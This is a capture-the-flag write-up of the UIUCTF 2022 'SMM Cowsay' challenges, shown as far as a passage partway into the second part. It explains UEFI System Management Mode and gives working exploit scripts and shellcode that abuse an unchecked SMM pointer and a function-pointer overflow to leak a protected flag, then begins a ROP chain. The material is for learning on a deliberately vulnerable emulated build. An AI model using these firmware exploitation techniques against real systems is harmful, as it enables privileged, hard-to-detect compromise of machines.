---
title:      UIUCTF 2022 - SMM Cowsay 1, 2, 3
author:     Marco Bonelli - @mebeim
date:       2022-08-15 13:37:00 +0200
summary:    ROP shenanigans to pwn UEFI drivers running in x86 System Management Mode
categories: UIUCTF pwn system x86 rop
tags:
 - UIUCTF
 - Pwn
 - System
 - x86
 - ROP
---

**Jump to**: [SMM Cowsay 1][smm1], [SMM Cowsay 2][smm2], [SMM Cowsay 3][smm3].

---

There was a pretty interesting "systems" category in [UIUCTF 2022][uiuctf]. In
this category, three challenges of increasing difficulty called "SMM Cowsay"
caught my eye. Unfortunately, I wasn't able to solve them before the end of the
CTF, but I found them so interesting that I kept going at them after the CTF,
and [ended up solving all three][tweet] after studying them enough time.

Huge shout out to the author of these awesome challenges: [YiFei Zhu][author],
who was also so kind to award me the small bounty of $50 posted on the first
blood for SMM Cowsay 3, which had remained unsolved after the CTF ended. All the
challenge files should still be up in the
[archived UIUCTF 2022 website][uiuctf-archive].


## Background on System Management Mode

[System Management Mode][wiki-smm] is documented in [Intel SDM][intel-sdm],
Volume 3C, Chapter 30. It is the operating mode with highest privilege, and
sometimes referred to as "ring -2". This mode has higher privilege than an
OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered
through a System Management Interrupt (SMI), it has a separate address space
completely invisible to other operating modes, and full access to all physical
memory, MSRs, control registers etc.

A special region of physical memory called SMRAM is the home of the SMI handler
code and also contains a save state area where the CPU state (most importantly
the values of all registers) is saved to and restored from when entering/exiting
SMM.

Upon receing an SMI and entering SMM the SMI handler is executed. It initially
runs code in a weird real-mode-on-steroids operating mode, but can switch to
32-bit protected mode, enable paging (and PAE), and even switch to 64-bit long
mode (and use 5-level paging). After doing what's needed, the SMI handler can
exit SMM with [the `RSM` instruction][x86-rsm], which restores the CPU state
from the save state area in SMRAM.

SMIs can be triggered by software using IO port `0xB2`, and this functionality
can be used to implement some controlled mechanism of communication between SMM
and non-SMM code.

This is more or less enough beckground on SMM to understand what's going on, and
I will explain the rest along the way. In any case, you can always check the
manuals I link. Now let's get into the challenges!

---

# SMM Cowsay 1

**Full exploit**: [expl_smm_cowasy_1.py][expl1]

The challenge description states:

> One of our engineers thought it would be a good idea to write Cowsay inside
> SMM. Then someone outside read out the trade secret (a.k.a. flag) stored at
> physical address 0x44440000, and since it could only be read from SMM, that
> can only mean one thing: it... was a horrible idea.

The goal of the challenge seems simple enough: read the flag which is at
physical address `0x44440000` *somehow*.

The files we are given contain:

- The built challenge binaries together with a `qemu-system-x86_64` binary and a
  startup script that supplies the needed arguments to run the challenge
  locally.
- Thee source code of the challenge as a series of patches to [EDK2][gh-edk2]
  (the de-facto standard UEFI implementation) and [QEMU][gh-qemu], along with a
  `Dockerfile` to apply them and build everything.
- EDK2 build artifacts (i.e. binaries with useful debug symbols) of the build
  done for the challenge running remotely.

Running the challenge, we are greeted with the following message:

```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)
Shell> binexec
 ____________________________________________________________________
/ Welcome to binexec!                                                \
| Type some shellcode in hex and I'll run it!                        |
|                                                                    |
| Type the word 'done' on a seperate line and press enter to execute |
\ Type 'exit' on a seperate line and press enter to quit the program /
 --------------------------------------------------------------------
                    \   ^__^
                     \  (oo)\_______
                        (__)\       )\/\
                            ||----w |
                            ||     ||

Address of SystemTable: 0x00000000069EE018
Address where I'm gonna run your code: 0x000000000517D100
```


## What are we dealing with?

### EDK2 patches

The EDK2 patch `0003-SmmCowsay-Vulnerable-Cowsay.patch` implements a UEFI SMM
driver called `SmmCowsay.efi`: this driver will run in SMM, and registers an
handler (through [the `SmiHandlerRegister` function][edk2-SmiHandlerRegister])
to be executed in SMM that prints text much like the [cowsay][man-cowsay] Linux
command does:

```c
  Status = gSmst->SmiHandlerRegister (
                    SmmCowsayHandler,
                    &gEfiSmmCowsayCommunicationGuid,
                    &DispatchHandle
                    );
```

When a SMI happens, the SMI handler registered by EDK2 goes through a linked
list of registered handlers and chooses the appropriate one to run.

The next patch `0004-Add-UEFI-Binexec.patch` implements a normal UEFI driver
called `Binexec.efi` which will interact both with us (through console
input/output) and with the `SmmCowsay.efi` driver to print the greeting banner
we see above when running challenge.

In order to communicate with the `SmmCowsay.efi` driver, `Binexec.efi` sends a
"message" through
[the `->Communicate()` method][edk2-SmmCommunicationCommunicate] provided by
[the `EFI_SMM_COMMUNICATION_PROTOCOL` struct][edk2-EFI_SMM_COMMUNICATION_PROTOCOL]:

```c
    mSmmCommunication->Communicate(
        mSmmCommunication, // "THIS" pointer
        Buffer,            // Pointer to message of type EFI_SMM_COMMUNICATE_HEADER
        NULL
    );
```

This function [copies the message][edk2-copy-msg] in a global variable and
triggers a software SMI to handle it. The message includes the GUID of the SMM
handler we want to communicate with, which is searched for in the linked list of
registered handlers when entering SMM.

The `Binexec.efi` driver will simply run in a loop asking us for some code in
hexadecimal form, copying it into an RWX memory area, and then jumping into it
(saving/restoring registers with an assembly wrapper). This means that we have
the ability to run arbitrary code inside an UEFI driver, which runs in
Supervisor Mode (a.k.a. ring 0).

### QEMU patch

The QEMU patch implements a custom MMIO device that simply reads a `region4`
file on the host machine and creates an MMIO memory region starting at physical
address `0x44440000` of size `0x1000` holding the content of this file. This
means that accessing physical memory at address `0x44440000` will invoke the
QEMU device read/write operations (`MemoryRegionOps`), which will decide how to
handle the memory read/write.

The read operation handler (`uiuctfmmio_region4_read_with_attrs()`) performs a
check ensuring that the read has
[the `.secure` flag set in the `MemTxAttrs` structure][qemu-memtxattrs] passed
to the function, meaning that the read was issued from SMM. If this is not the
case, a fake flag is returned instead:

```c
static MemTxResult uiuctfmmio_region4_read_with_attrs(
    void *opaque, hwaddr addr, uint64_t *val, unsigned size, MemTxAttrs attrs)
{
    if (!attrs.secure)
        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);
    else
        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);
    return MEMTX_OK;
}
```

### EFI System Table

We are also given the address of a `SystemTable` and the address where our
shellcode will copied (and ran). The [UEFI Specification][uefi-spec], on which I
probably spent more time than needed, contains all the information we need to
understand what this is about.

This `SystemTable` is the [*EFI System Table*][edk2-SystemTable], which is a
strucure containing all the information needed to do literally *anything* in an
UEFI driver. It holds a bunch of pointers to other structures, which in term
hold another bunch of pointers to API methods, configuration variables, and so
on.

What we are interested in for now is the `BootServices` field of the EFI System
Table, which holds a pointer to the *EFI Boot Services Table* (see chapter 4.4
of the [UEFI Spec v2.9][uefi-spec-pdf]): another table holding a bunch of useful
function pointers for different UEFI APIs.


## Let's run some UEFI shellcode

*Ok, technically speaking it's not shellcode if it doesn't spawn a shell... but
bear with me on the terminology here :').* We can test the functionality of the
`Binexec` driver by assembling and running a simple `mov eax, 0xdeadbeef`. I am
using [pwntools][gh-pwntools] to quickly assemble the code from a shell.

```
$ pwn asm -c amd64 'mov eax, 0xdeadbeef'
b8efbeadde
----- snip -----

b8efbeadde
done
Running...
RAX: 0x00000000DEADBEEF RBX: 0x00000000069EE018 RCX: 0x0000000000000000
RDX: 0x000000000517CA1C RSI: 0x000000000517D100 RDI: 0x0000000000000005
RBP: 0x000000000000000F R08: 0x0000000000000001 R09: 0x000000000517CA2C
R10: 0x0000000000000000 R11: 0x000000000517BFA6 R12: 0x0000000005508998
R13: 0x0000000000000000 R14: 0x0000000006F9C420 R15: 0x0000000006F9C428
Done! Type more code
```

The driver works as intended and we also get a nice register dump after the
shellcode finishes execution... well easy! Let's try to read the flag into a
register then:

```
$ pwn asm -c amd64 'mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]'
488b042500004444488b1c2508004444
----- snip -----

488b042500004444488b1c2508004444
done
Running...
RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000
...
----- snip -----

$ python3
>>> (0x6E7B667463756975).to_bytes(8, "little")
b'uiuctf{n'
>>> (0x2179727420656369).to_bytes(8, "little")
b'ice try!'
```

Ok, the QEMU patch works as expected: the MMIO driver saw that we are not
reading memory from System Management Mode and gave us the fake flag. Even
though we do have access to physical memory, we still cannot read the flag by
running code in the `Binexec.efi` driver. We need to read it from System
Management Mode.


## The vulnerability

Looking at the source code in the patch implementing `Binexec.efi`, we can see
how the communication with `SmmCowsay.efi` works in order to print the greeting
banner:

```c
VOID
Cowsay (
    IN CONST CHAR16 *Message
    )
{
    EFI_SMM_COMMUNICATE_HEADER *Buffer;

    Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));
    if (!Buffer)
        return;

    Buffer->HeaderGuid = gEfiSmmCowsayCommunicationGuid;
    Buffer->MessageLength = sizeof(CHAR16 *);
    *(CONST CHAR16 **)&Buffer->Data = Message;

    mSmmCommunication->Communicate(
        mSmmCommunication,
        Buffer,
        NULL
    );

    FreePool(Buffer);
}
```

As already said above, normal UEFI drivers can communicate through this
"SmmCommunication" protocol with SMM UEFI drivers that have an appropriate
handler registered, and data is passed through a pointer to a
`EFI_SMM_COMMUNICATE_HEADER` structure:

```c
typedef struct {
  EFI_GUID HeaderGuid;
  UINTN MessageLength;
  UINT8 Data[ANYSIZE_ARRAY];
} EFI_SMM_COMMUNICATE_HEADER;
```

This simple structure should contain the GUID of the SMM driver we want to
communicate with (in this case the GUID registered by `SmmCowsay`), a message
length, and a flexible array member of `MessageLength` bytes containing the
actual message.

The imporatant thing to notice here is this line:

```c
    *(CONST CHAR16 **)&Buffer->Data = Message;
```

In this case, the message being sent is simply a pointer, which is copied into
the `->Data` array member *as is*. In other words, `Binexec.efi` sends a pointer
to the string to print to `SmmCowsay.efi` through
`mSmmCommunication->Communicate`. If we take a look at `SmmCowsay.efi` handles
the pointer, we can see that it isn't treated in any special way. It is simply
passed as is to the printing function:

```c
EFI_STATUS
EFIAPI
SmmCowsayHandler (
    IN EFI_HANDLE  DispatchHandle,
    IN CONST VOID  *Context         OPTIONAL,
    IN OUT VOID    *CommBuffer      OPTIONAL,
    IN OUT UINTN   *CommBufferSize  OPTIONAL
    )
{
    DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Enter\n"));

    if (!CommBuffer || !CommBufferSize || *CommBufferSize < sizeof(CHAR16 *))
        return EFI_SUCCESS;

    Cowsay(*(CONST CHAR16 **)CommBuffer); // <== pointer passed *as is* here

    DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Exit\n"));

    return EFI_SUCCESS;
}
```

This means that we can pass an arbitrary pointer to the `SmmCowsay` driver, and
it will happily read memory at the given address for us, displaying it on the
console as if it was a NUL-terminated `CHAR16` string. If we build an
`EFI_SMM_COMMUNICATE_HEADER` with `->Data` containing the value `0x44440000` and
pass it to the SMM driver through `mSmmCommunication->Communicate`, we can get
it to print the flag for us!

But how do we get ahold of this "SmmCommunication" protocol to call its
`->Communicate()` method? Taking a look at the code in `Binexec.efi`,
`mSmmCommunication` is simply a pointer obtained passing the right GUID to
`BootServices->LocateProtocol()`, like this:

```c
    Status = gBS->LocateProtocol(
        &gEfiSmmCommunicationProtocolGuid,
        NULL,
        (VOID **)&mSmmCommunication
        );
```


## Exploitation

All we need to do in order to get the flag is simply replicate exactly what the
`Binexec` driver is doing, passing a different pointer to `SmmCowsay` and let it
print the memory content to the console for us. In theory we could do everything
with a single piece of assembly, but since we have the ability to send multiple
pieces of code in a loop and observe the results, let's split this into simpler
steps so that we can check if things are OK along the way.

### Step 1: get ahold of BootServices->LocateProtocol

The `LocateProtocol` function is provided in the `BootServices` table (`gBS`),
of which we actually have a pointer in the `SystemTable`. We know the address of
`SystemTable` since it is printed to the console for us, though to be pedantic
this does not really matter since it is a fixed address and there isn't any kind
of address randomization going on.

We need to get `SystemTable->BootServices->LocateProtocol`. In theory all
addresses are fixed in our working environment (both locally and remote) due to
no ASLR being applied by EDK2, so we *could* just get the address of any
function we need and do direct calls, but let's do it the right way because (1)
we'll actually learn something, (2) we'll nonethless need it for the next
challenges and most importantly (3) *I did not think about it originally and I
already have the code to do it anyway :')*.

We can get `LocateProtocol` pretty easily with a couple of MOV instructions. The
debug artifacts provided with the challenge files also include all the structure
definitions we need in the debug symbols, so we can check the DWARF info in
`handout/edk2_artifacts/Binexec.debug` to get the offsets of the fields. I'll
use [the `pahole` utility][man-pahole] (from the `dwarves` Debian package) for
this:

```c
$ pahole -C EFI_SYSTEM_TABLE handout/edk2_artifacts/Binexec.debug

typedef struct {
    EFI_TABLE_HEADER           Hdr;                  /*     0    24 */
    CHAR16 *                   FirmwareVendor;       /*    24     8 */
    UINT32                     FirmwareRevision;     /*    32     4 */

    /* XXX 4 bytes hole, try to pack */

    EFI_HANDLE                 ConsoleInHandle;      /*    40     8 */
    EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          /*    48     8 */
    EFI_HANDLE                 ConsoleOutHandle;     /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        /*    64     8 */
    EFI_HANDLE                 StandardErrorHandle;  /*    72     8 */
    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        /*    80     8 */
    EFI_RUNTIME_SERVICES *     RuntimeServices;      /*    88     8 */
    EFI_BOOT_SERVICES *        BootServices;         /*    96     8 */
    UINTN                      NumberOfTableEntries; /*   104     8 */
    EFI_CONFIGURATION_TABLE *  ConfigurationTable;   /*   112     8 */

    /* size: 120, cachelines: 2, members: 13 */
    /* sum members: 116, holes: 1, sum holes: 4 */
    /* last cacheline: 56 bytes */
} EFI_SYSTEM_TABLE;
```

This tells us that `BootServices` is at offset 96 in `SystemTable` (type
`EFI_SYSTEM_TABLE`). Likewise we can look at `EFI_BOOT_SERVICES` to see that
`LocateProtocol` is at offset `320` in
`BootServices`.

Setting things up with Python and pwtools, the code needed is as follows:

```python
# Little hack needed to disable pwntools from taking over the terminal with
# ncurses and breaking the output if we do conn.interactive() since the remote
# program outputs \r\n for newlines.
import os
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

context(arch='amd64')

os.chdir('handout/run')
conn = process('./run.sh')
os.chdir('../..')

conn.recvuntil(b'Address of SystemTable: ')
system_table = int(conn.recvline(), 16)

log.info('SystemTable @ 0x%x', system_table)

conn.recvline()

code = asm(f'''
    mov rax, {system_table}
    mov rax, qword ptr [rax + 96]  /* SystemTable->BootServices */
    mov rbx, qword ptr [rax + 64]  /* BootServices->AllocatePool */
    mov rcx, qword ptr [rax + 320] /* BootServices->LocateProtocol */
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RBX: 0x')
AllocatePool = int(conn.recvn(16), 16) # useful for later
conn.recvuntil(b'RCX: 0x')
LocateProtocol = int(conn.recvn(16), 16)

log.success('BootServices->AllocatePool   @ 0x%x', AllocatePool)
log.success('BootServices->LocateProtocol @ 0x%x', LocateProtocol)
```

### Step 2: get ahold of mSmmCommunication to talk to SmmCowsay

In order to locate `mSmmCommunication` we need to pass a pointer to the protocol
GUID to `LocateProtocol`, and a pointer to the a location where the resulting
pointer should be stored. We already have a RWX area of memory available (the
one where our shellcode is written), so let's use that. We normally wouldn't,
but the patch `0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch`
to EDK2 sets all entries of the page table to RWX so we're good.

From disassembling any of the UEFI drivers, we can see that the calling
convention is [Microsoft x64][x64-call], so arguments in RCX, RDX, R8, R9, then
stack.

```python
# Taken from EDK2 source code (or opening Binexec.efi in a disassembler)
gEfiSmmCommunicationProtocolGuid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2

code = asm(f'''
    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &protocol) */
    lea rcx, qword ptr [rip + guid]
    xor rdx, rdx
    lea r8, qword ptr [rip + protocol]
    mov rax, {LocateProtocol}
    call rax

    test rax, rax
    jnz fail

    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */
    mov rbx, qword ptr [rax]            /* mSmmCommunication->Communicate */
    ret

fail:
    ud2

guid:
    .octa {gEfiSmmCommunicationProtocolGuid}
protocol:
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
mSmmCommunication = int(conn.recvn(16), 16)
conn.recvuntil(b'RBX: 0x')
Communicate = int(conn.recvn(16), 16)

log.success('mSmmCommunication              @ 0x%x', mSmmCommunication)
log.success('mSmmCommunication->Communicate @ 0x%x', Communicate)
```

### Step 3: kindly ask SmmCowsay to print the flag for us

We can now craft a message for `SmmCowsay` containing a pointer to the flag and
let it print it for us by calling `mSmmCommunication->Communicate` with the
right arguments. We can see the layout of `EFI_SMM_COMMUNICATE_HEADER` using
`pahole` again, inspecting the UEFI Specification PDF, or looking at EDK2 source
code.

```python
# Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch
gEfiSmmCowsayCommunicationGuid = 0xf79265547535a8b54d102c839a75cf12

code = asm(f'''
    /* Communicate(mSmmCommunication, &buffer, NULL) */
    mov rcx, {mSmmCommunication}
    lea rdx, qword ptr [rip + buffer]
    xor r8, r8
    mov rax, {Communicate}
    call rax

    test rax, rax
    jnz fail
    ret

fail:
    ud2

buffer:
    .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
    .quad 8                                /* Buffer->MessageLength */
    .quad 0x44440000                       /* Buffer->Data */
''')
conn.sendline(code.hex().encode() + b'\ndone')

# Check output to see if things work
conn.interactive()
```

Wait a second though. This code does not work!

```
Running...
!!!! X64 Exception Type - 06(#UD - Invalid Opcode)  CPU Apic ID - 00000000 !!!!
RIP  - 000000000517D120, CS  - 0000000000000038, RFLAGS - 0000000000000286
RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2
...
```

We hit the `ud2` in the `fail:` label and got a nice register dump, because
`Communicate` returned `0x800000000000000F`: which according to the UEFI Spec
(Appendix D - Status Codes) means `EFI_ACCESS_DENIED`.

Indeed there is a gotcha: even though the challenge author explicitly added an
EDK2 patch to mark all all memory as RWX in the SMM page table
(`0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch`), there is
still a sanity check being performed on the SMM communication buffer,
[as we can see in EDK2 source code][edk2-buffer-check], which errors out if the
buffer resides in untrusted or invalid memory regions (like the one used for our
shellcode). *Thanks to YiFei for pointing this out since I had not actually
figured out the real reason behind the "access denied" when working on the
challenge*.

In fact, looking at the code for `Binexec.efi` above, in the `Cowsay()` function
the `EFI_SMM_COMMUNICATE_HEADER` is actually allocated using the library
function `AllocateRuntimeZeroPool()`. We don't have a nice pointer to this
function, but can allocate memory using either `BootServices->AllocatePool()` or
`BootServices->AllocatePages()` specifying the "type" of memory we want to
allocate. The `EFI_MEMORY_TYPE` we want is
[the type `EfiRuntimeServicesData`][edk2-EfiRuntimeServicesData], which will be
accessible from SMM.

```python
EfiRuntimeServicesData = 6

code = asm(f'''
    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer) */
    mov rcx, {EfiRuntimeServicesData}
    mov rdx, 0x1000
    lea r8, qword ptr [rip + buffer]
    mov rax, {AllocatePool}
    call rax

    test rax, rax
    jnz fail

    mov rax, qword ptr [rip + buffer]
    ret

fail:
    ud2

buffer:
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
buffer = int(conn.recvn(16), 16)
log.success('Allocated buffer @ 0x%x', buffer)

code = asm(f'''
    /* Copy data into allocated buffer */
    lea rsi, qword ptr [rip + data]
    mov rdi, {buffer}
    mov rcx, 0x20
    cld
    rep movsb

    /* Communicate(mSmmCommunication, buffer, NULL) */
    mov rcx, {mSmmCommunication}
    mov rdx, {buffer}
    xor r8, r8
    mov rax, {Communicate}
    call rax

    test rax, rax
    jnz fail
    ret

fail:
    ud2

data:
    .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
    .quad 8                                /* Buffer->MessageLength */
    .quad 0x44440000                       /* Buffer->Data */
''')

conn.sendline(code.hex().encode())
conn.sendline(b'done')
```

Output:

```
Running...
 __________________________
< uut{hnrn_eoi_nufcet3201} --------------------------
          \   ^__^
           \  (oo)\_______
              (__)\       )\/\
                  ||----w |
                  ||     ||
```

Remember that we are dealing with UTF16 strings? The print routine in
`SmmCowsay` seems to just skip half the characters for this reason. We can
simply print again passing `0x44440001` as pointer to get the second half of the
flag:

```
Running...
 _________________________
< icfwe_igzr_sisfiin_55e8 >
 -------------------------
          \   ^__^
           \  (oo)\_______
              (__)\       )\/\
                  ||----w |
                  ||     ||
```

Reassembling it gives us: `uiuctf{when_ring_zero_is_insufficient_35250e18}`.

---

# SMM Cowsay 2

**Full exploit**: [expl_smm_cowasy_2.py][expl2]

> We asked that engineer to fix the issue, but I think he may have left a
> backdoor disguised as debugging code.

We are still in the exact same environment as before, but the code for the
`SmmCowsay.efi` driver was changed. Additionally, we no longer have global RWX
memory as the fifth EDK2 patch
(`0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch`) now does not unlock page
table entry permissions, but instead *explicitly sets the memory area containing
the flag as read-protected!*

```c
  SmmSetMemoryAttributes (
    0x44440000,
    EFI_PAGES_TO_SIZE(1),
    EFI_MEMORY_RP
    );
```

A hint is also given in the commit message:

```
From: YiFei Zhu <zhuyifei@google.com>
Date: Mon, 28 Mar 2022 17:55:14 -0700
Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses

So attacker must disable paging or overwrite page table entries
(which would require disabling write protection in cr0... so, the
latter is redundant to former)
```

The first thing the [EDK2 SMI handler][edk2-smi-entry] does is set up a 4-level
page table and enable 64-bit long mode, so SMM code runs in 64-bit mode with a
page table.

The virtual addresses stored in the page table correspond 1:1 to physical
addresses, so the page table itself is only used as a way to manage permissions
for different memory areas (for example, page table entries for pages that do
not contain code will have the NX bit set). The flag page (`0x44440000`) was
marked as "read-protect" which simply means that the corresponding page table
entry will have the present bit clear, and thus any access will result in a page
fault.


## Vulnerability

Let's look at the updated code for `SmmCowsay.efi`. How is the communication
handled now? We have a new `mDebugData` structure:

```c
struct {
  CHAR16 Message[200];
  VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);
  BOOLEAN volatile Icebp;
  UINT64 volatile Canary;
} mDebugData;
```

This structure holds a `->CowsayFunc` function pointer, which is set when the
driver is initialized:

```c
mDebugData.CowsayFunc = Cowsay;
```

The SMM handler code uses the `mDebugData` structure as follows upon receiving a
message:

```c
EFI_STATUS
EFIAPI
SmmCowsayHandler (
  IN EFI_HANDLE  DispatchHandle,
  IN CONST VOID  *Context         OPTIONAL,
  IN OUT VOID    *CommBuffer      OPTIONAL,
  IN OUT UINTN   *CommBufferSize  OPTIONAL
  )
{
  EFI_STATUS Status;
  UINTN TempCommBufferSize;
  UINT64 Canary;

  DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Enter\n"));

  if (!CommBuffer || !CommBufferSize)
    return EFI_SUCCESS;

  TempCommBufferSize = *CommBufferSize;

  // ... irrelevant code ...

  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);
  if (EFI_ERROR(Status))
    goto out;

  // ... irrelevant code ...

  SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);

  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);

out:
  DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Exit\n"));

  return EFI_SUCCESS;
}
```

The problem is clear as day:

```c
  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);
  if (EFI_ERROR(Status))
    goto out;
```

Here we have a memcpy-like function performing a copy from the `->Data` field of
the `EFI_SMM_COMMUNICATE_HEADER` (passed as `CommBuffer`) using the
`->MessageLength` field as size (passed as `CommBufferSize`). The size is
trusted and used as is, so any size above 400 will overflow the
`CHAR16 Message[200]` field of `mDebugData` and corrupt the `CowsayFunc`
function pointer, which is then called right away.


## Exploitation

The situation seems simple enough: send 400 bytes of garbage followed by an
address and get RIP control inside System Management Mode. Once we have RIP
control, we can build a ROP chain to either (A) disable paging altogether and
read the flag, or (B) disable `CR0.WP` (since the page table is read only) and
patch the page table entry for the flag to make it readable.

Method A was the author's solution. In fact there already is
[a nice segment descriptor][edk2-gdt] for 32-bit protected mode in the SMM GDT
that we could use for the code segment (`CS` register). However I went with
method (B) because it seemed more straightforward. *Ok, honestly speaking I
couldn't be bothered with figuring out how to correctly do the mode switch in
terms of x86 assembly as I had never done it before, can you blame me? :')*

There is a bit of a problem in building a ROP chain though: after the `call` to
our address we lose control of the execution as we do not control the SMM stack.
It would be nice to simply overwrite the function pointer with the address of
our shellcode buffer and execute arbitrary code in SMM, but as we already saw
earlier, SMM cannot access that memory region, and this would just result in a
crash.

### Finding ROP gadgets

**What can we access then?** It's clear that we'll need to ROP our way to
victory. We can modify the `run.sh` script provided to run the challenge locally
in QEMU to capture EDK2 debug messages and write them to a file (we have a
`handout/edk2debug.log` which was obtained in the same way from a sample run
when building the challenge, but it's nice to have our own). Let's add the
following arguments to the QEMU command line in `handout/run/run.sh`:

```
-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log
```

Now we can run the challenge and take a look at `debug.log`. Among the various
debug messages, EDK2 prints the base address and the entry point of every driver
it loads:

```
$ cd handout/run; ./run.sh; cd -
$ cat debug.log | grep 'SMM driver'
Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi
Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi
Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi
Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi
Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi
Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi
Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi
Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi
```

Surely enough, the `.text` section of all these drivers will contain code we can
execute in SMM. What ROP gadgets do we have?
[Let's use `ROPGadget`][gh-ropgadget] to find them, using the base addresses
provided by the EDK2 debug log:

```bash
cd handout/edk2_artifacts
ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 >> ../../gadgets.txt
ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 >> ../../gadgets.txt
# ... and so on ...
```

Even though we have a lot of gadgets, we need multiple ones to build a useful
ROP chain. After the `ret` from the first gadget, control will return back to
`SmmCowsayHandler` if we do not somehow move the stack (RSP) to a controlled
memory region, so the first gadget we need is one that is able to flip the stack
where we want.

There is [*a very nice gadget*][edk2-gadget] in EDK2 code:

```c
// MdePkg/Library/BaseLib/X64/LongJump.nasm
CetDone:

    mov     rbx, [rcx]
    mov     rsp, [rcx + 8]
    mov     rbp, [rcx + 0x10]
    mov     rdi, [rcx + 0x18]
    mov     rsi, [rcx + 0x20]
    mov     r12, [rcx + 0x28]
    mov     r13, [rcx + 0x30]
    mov     r14, [rcx + 0x38]
    mov     r15, [rcx + 0x40]
// ...
    jmp     qword [rcx + 0x48]
```

Our function pointer will be called with `CommBuffer` as first argument (RCX),
so jumping here would load a bunch of registers **including RSP** directly from
data we provide. This is very nice, and indeed the author's solution uses this
to easily flip the stack and continue the ROP chain, but `ROPgadget` was not
smart enough to find it for me, and I did not notice it when skimming through
EDK2 source code while solving the challenge. *Too bad!* It would have
definitely saved me some time :'). I will avoid using it and show how I
originally solved the challenge to make things more interesting.

### Flipping the stack to controlled memory for a ROP chain

In any case, we still have a nice trick up our sleeve. See, it's true that we do
not control the SMM stack, but what if some of our registers got spilled on the
stack? With a gadget of the form `ret 0x123` or `add rsp, 0x123; ret` we would
be able to move the stack pointer forward and use anything that we control on
the SMM stack as another gadget. In order to check this we can attach a debugger
to QEMU and break at the call to `mDebugData.CowsayFunc()` in
`SmmCowsayHandler()`.

We can enable debugging in QEMU by simply adding `-s` to the command line, and
then attach to it from GDB. I wrote a simple Python GDB plugin to load debug
symbols from the `.debug` files we have to make our life easier:

```python
import gdb
import os

class AddAllSymbols(gdb.Command):
    def __init__ (self):
        super (AddAllSymbols, self).__init__ ('add-all-symbols',
            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, True)

    def invoke(self, args, from_tty):
        print('Adding symbols for all EFI drivers...')

        with open('debug.log', 'r') as f:
            for line in f:
                if line.startswith('Loading SMM driver at'):
                    line = line.split()
                    base = line[4]
                elif line.startswith('Loading driver at') or line.startswith('Loading PEIM at'):
                    line = line.split()
                    base = line[3]
                else:
                    continue

                path = 'handout/edk2_artifacts/' + line[-1].replace('.efi', '.debug')
                if os.path.isfile(path):
                    gdb.execute('add-symbol-file ' + path + ' -readnow -o ' + base)

AddAllSymbols()
```

The first part of the exploit is the same as for SMM Cowsay 1: get ahold of
`BootServices->AllocatePool` and `->LocateProtocol`, find the `SmmCommunication`
protocol, allocate some memory to write our message, and send it to `SmmCowsay`
through its SMI handler. The only thing that changes is *what we are sending*:
this time the `->Data` field of the `EFI_SMM_COMMUNICATE_HEADER` will be filled
with a string of 400 bytes of garbage plus 8 more to overwrite the function
pointer.

We will fill all unused general purpose register with easily identifiable values
so that we can see what is spilled on the stack:

```python
# ... same code as for SMM Cowsay 1 up to the allocation of `buffer`

input('Attach GDB now and press [ENTER] to continue...')

payload = 'A'.encode('utf-16-le') * 200 + p64(0x4141414141414141)

code = asm(f'''
    /* Copy data into allocated buffer */
    lea rsi, qword ptr [rip + data]
    mov rdi, {buffer}
    mov rcx, {0x18 + len(payload)}
    cld
    rep movsb

